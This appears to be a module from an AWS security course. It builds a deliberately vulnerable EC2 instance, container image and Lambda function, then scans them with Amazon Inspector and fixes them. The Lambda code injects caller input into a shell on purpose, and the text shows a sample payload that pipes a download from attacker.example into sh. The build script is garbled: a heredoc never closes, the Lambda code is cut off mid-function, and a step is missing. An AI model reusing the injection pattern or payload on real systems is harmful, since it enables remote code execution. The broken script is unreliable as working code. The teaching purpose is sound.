Module 3

Vulnerability Management and Application Security Testing

Scan servers, container images and Lambda code for known software weaknesses. Use cases 3: Vulnerability Management and 6: Application Security Testing.

Use cases: 3. Vulnerability Management, 6. Application Security TestingServices: Inspector, ECR, EC2, LambdaTime: about 90 minutesCost: free trial and free tier

Limits of what Prowler checks in this module

  • Prowler checks that Amazon Inspector and ECR scanning are turned on and whether vulnerability findings are open. It does not scan software itself.
  • Prowler does not run application security tests on a running application or penetration tests, which PCI-DSS requires separately.
  • Inspector only reports weaknesses that are already publicly known. It cannot find new, unknown weaknesses.

Use caseWhat it meansAWS service in this module

Amazon Inspector does the scanning. Prowler checks that Inspector and image scanning are turned on, and whether vulnerability findings are still open.

Cost: Amazon Inspector has a 15-day free trial. The EC2 instance is a t3.micro, which is free-tier eligible for many accounts. ECR storage for two small images costs a few cents. Stop or remove the instance when you finish the course.
You need Docker running for this module. The image is built for linux/amd64, so it also builds on Apple silicon computers.

Step 1: Add a shared function for launching the instance

The project's EC2 instance is launched again in Module 5, so the launch command goes into a shared file.

lib/launch-instance.sh
# lib/launch-instance.sh — shared function to launch the project's EC2 instance
# Usage: launch_instance <optional|required>
#   optional = instance metadata version 1 allowed (weak)
#   required = instance metadata version 2 only (strong)
launch_instance() {
  local tokens="$1"
  local ami
  ami=$(aws ssm get-parameter "${A[@]}" \
    --name /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64 \
    --query Parameter.Value --output text)
  aws ec2 run-instances "${A[@]}" \
    --image-id "$ami" --instance-type t3.micro \
    --security-group-ids "$SG_ID" \
    --iam-instance-profile Name="$PROJECT-ec2-profile" \
    --metadata-options "HttpTokens=$tokens,HttpEndpoint=enabled" \
    --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=$PROJECT-app}]" \
    --query 'Instances[0].InstanceId' --output text
}

Step 2: Build the weak setup (before state)

The build script creates an EC2 instance that still allows the old instance metadata service (version 1), an ECR repository without scan on push holding an image with old libraries, and a Lambda function that passes caller input to a shell.

build/m3-build.sh
#!/usr/bin/env bash
# Module 3 build: server, container image and Lambda code with weaknesses (before state)
set -euo pipefail
cd "$(dirname "$0")/.."
source ./env.sh
source ./lib/launch-instance.sh

# 1. Role for the EC2 instance (Systems Manager agent: patching and Session Manager)
cat > policies/ec2-trust.json <<'EOF'
{"Version": "2012-10-17",
 "Statement": [{"Effect": "Allow", "Principal": {"Service": "ec2.amazonaws.com"},
                "Action": "sts:AssumeRole"}]}
EOF
aws iam create-role "${G[@]}" --role-name "$PROJECT-ec2-role" \
  --assume-role-policy-document file://policies/ec2-trust.json
aws iam attach-role-policy "${G[@]}" --role-name "$PROJECT-ec2-role" \
  --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
aws iam create-instance-profile "${G[@]}" --instance-profile-name "$PROJECT-ec2-profile"
aws iam add-role-to-instance-profile "${G[@]}" \
  --instance-profile-name "$PROJECT-ec2-profile" --role-name "$PROJECT-ec2-role"
sleep 15   # give IAM time to make the instance profile available

# 2. Security group in the default VPC, with no inbound rules
VPC_ID=$(aws ec2 describe-vpcs "${A[@]}" --filters Name=isDefault,Values=true \
  --query 'Vpcs[0].VpcId' --output text)
save_id VPC_ID "$VPC_ID"
SG_ID=$(aws ec2 create-security-group "${A[@]}" --group-name "$PROJECT-app-sg" \
  --description "sf-secure-store app" --vpc-id "$VPC_ID" --query GroupId --output text)
save_id SG_ID "$SG_ID"

# 3. EC2 instance that still allows instance metadata version 1 (weak)
INSTANCE_ID=$(launch_instance optional)
save_id INSTANCE_ID "$INSTANCE_ID"
aws ec2 wait instance-running "${A[@]}" --instance-ids "$INSTANCE_ID"

# 4. ECR repository without scan on push (weak)
aws ecr create-repository "${A[@]}" --repository-name "$PROJECT/api" \
  --image-scanning-configuration scanOnPush=false

# Container image with an old base image and old libraries (weak)
mkdir -p app/container
cat > app/container/Dockerfile <<'EOF'
FROM python:3.8-slim
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
CMD ["python", "-c", "print('sf-secure-store api')"]
EOF
printf 'requests==2.19.1\nurllib3==1.23\n' > app/container/requirements.txt

REGISTRY="$ACCOUNT_ID.dkr.ecr.$AWS_REGION.amazonaws.com"
aws ecr get-login-password "${A[@]}" | docker login --username AWS --password-stdin "$REGISTRY"
docker build --platform linux/amd64 -t "$REGISTRY/$PROJECT/api:v1" app/container
docker tag "$REGISTRY/$PROJECT/api:v1" "$REGISTRY/$PROJECT/api:latest"
docker push "$REGISTRY/$PROJECT/api:v1"
docker push "$REGISTRY/$PROJECT/api:latest"

# 5. Lambda function with an unsafe code pattern (weak)
cat > policies/lambda-trust.json <<'EOF'
{"Version": "2012-10-17",
 "Statement": [{"Effect": "Allow", "Principal": {"Service": "lambda.amazonaws.com"},
                "Action": "sts:AssumeRole"}]}

aws iam create-role "${G[@]}" --role-name "$PROJECT-lambda-role" \
  --assume-role-policy-document file://policies/lambda-trust.json
aws iam attach-role-policy "${G[@]}" --role-name "$PROJECT-lambda-role" \
  --policy-arn arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
sleep 10

mkdir -p app/lambda
cat > app/lambda/report.py <<'EOF'
import subprocess


def handler(event, context):
    # Weak: the report name comes from the caller and is passed to a shell
    name = event.get("report", "daily")

  --zip-file fileb://app/lambda/report.zip

echo "Module 3 build complete."
chmod +x build/m3-build.sh
./build/m3-build.sh

The weak Lambda code

app/lambda/report.py (before)
import subprocess


def handler(event, context):
    # Weak: the report name comes from the caller and is passed to a shell
    name = event.get("report", "daily")
    out = subprocess.run("cat /tmp/" + name + ".txt", shell=True,
                         capture_output=True, text=True)
    return {"output": out.stdout}

A caller can send {"report": "x; curl http://attacker.example | sh"}. Because the text is joined into a shell command, the extra command runs inside the function. This is called command injection.

If your account has no default VPC in ap-south-1, create one first with aws ec2 create-default-vpc --profile lab-admin --region ap-south-1.

Step 4: Fix the weaknesses (after state)

fix/m3-fix.sh
#!/usr/bin/env bash
# Module 3 fix: turn on Inspector, patch and harden (after state)
set -euo pipefail
cd "$(dirname "$0")/.."
source ./env.sh

# 1. Amazon Inspector for EC2, ECR images, Lambda packages and Lambda code
aws inspector2 enable "${A[@]}" --resource-types EC2 ECR LAMBDA LAMBDA_CODE

# 2. EC2: require instance metadata version 2, then install security updates
aws ec2 modify-instance-metadata-options "${A[@]}" --instance-id "$INSTANCE_ID" \
  --http-tokens required --http-endpoint enabled
aws ssm send-command "${A[@]}" --document-name AWS-RunPatchBaseline \
  --targets "Key=InstanceIds,Values=$INSTANCE_ID" \
  --parameters Operation=Install --comment "sf-secure-store patching" \
  --query Command.CommandId --output text

# 3. ECR: scan on push, then push an image with an updated base and libraries
aws ecr put-image-scanning-configuration "${A[@]}" --repository-name "$PROJECT/api" \
  --image-scanning-configuration scanOnPush=true
cat > app/container/Dockerfile <<'EOF'
FROM python:3.12-slim
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
CMD ["python", "-c", "print('sf-secure-store api')"]
EOF
printf 'requests==2.32.3\nurllib3==2.2.3\n' > app/container/requirements.txt

REGISTRY="$ACCOUNT_ID.dkr.ecr.$AWS_REGION.amazonaws.com"
aws ecr get-login-password "${A[@]}" | docker login --username AWS --password-stdin "$REGISTRY"
docker build --platform linux/amd64 -t "$REGISTRY/$PROJECT/api:v2" app/container
docker tag "$REGISTRY/$PROJECT/api:v2" "$REGISTRY/$PROJECT/api:latest"
docker push "$REGISTRY/$PROJECT/api:v2"
docker push "$REGISTRY/$PROJECT/api:latest"

# 4. Lambda: accept only known report names and do not use a shell
cat > app/lambda/report.py <<'EOF'
import subprocess

ALLOWED_REPORTS = {"daily", "weekly"}


def handler(event, context):
    # Fixed: only known report names are accepted, and no shell is used
    name = event.get("report", "daily")
    if name not in ALLOWED_REPORTS:
        return {"error": "unknown report"}
    out = subprocess.run(["cat", f"/tmp/{name}.txt"],
                         capture_output=True, text=True)
    return {"output": out.stdout}
EOF
(cd app/lambda && rm -f report.zip && zip -q report.zip report.py)
aws lambda update-function-code "${A[@]}" --function-name "$PROJECT-report" \
  --zip-file fileb://app/lambda/report.zip

echo "Module 3 fix complete. Wait 20 to 30 minutes for Amazon Inspector to finish scanning."
chmod +x fix/m3-fix.sh
./fix/m3-fix.sh

Read the Inspector findings

Inspector needs 20 to 30 minutes for its first scans. Then open Amazon Inspector in the AWS console and go to Findings > By repository and By Lambda function. For the v1 image you will see findings for the old requests and urllib3 libraries, each with a CVE ID, a severity and the fixed version. Lambda code scanning may report the shell command pattern in the original code; because you replaced the code, its findings close at the next scan.

# Count open Inspector findings by severity
aws inspector2 list-finding-aggregations "${A[@]}" --aggregation-type ACCOUNT \
  --query 'responses[0].accountAggregation.severityCounts'

inspector2_active_findings_exist may still fail if Inspector finds vulnerabilities in the operating system or in the old v1 image, which is still stored. That is the check doing its job: it tells you open vulnerabilities remain. Delete the old image tag with aws ecr batch-delete-image "${A[@]}" --repository-name "$PROJECT/api" --image-ids imageTag=v1 and scan again later.
